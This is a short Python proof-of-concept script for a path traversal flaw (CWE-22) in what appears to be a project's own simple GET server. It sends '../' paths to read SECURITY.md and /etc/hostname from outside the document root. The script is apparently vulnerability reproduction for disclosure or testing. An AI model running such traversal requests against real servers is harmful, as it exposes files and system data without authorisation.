#!/usr/bin/env python3
"""V3 - Path traversal in GET (CWE-22).
GET joins the client path under "public/" without canonicalization, so "../"
reads files outside the document root (here the project's own SECURITY.md and
the host's /etc/hostname)."""
import socket
import sys


def fetch(host: str, port: int, path: str) -> str:
    with socket.create_connection((host, port), timeout=5) as s:
        s.sendall(f"GET {path}\n".encode())
        return s.recv(8192).decode("latin-1", "replace").strip()


def main() -> int:
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    print("GET ../SECURITY.md  ->", repr(fetch(host, port, "../SECURITY.md")[:60]))
    # Extra "../" segments are harmless once resolution reaches /, so this is
    # robust to the target's nesting depth.
    print("GET <many>/etc/hostname ->",
          repr(fetch(host, port, "../../../../../../../../etc/hostname")[:60]))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
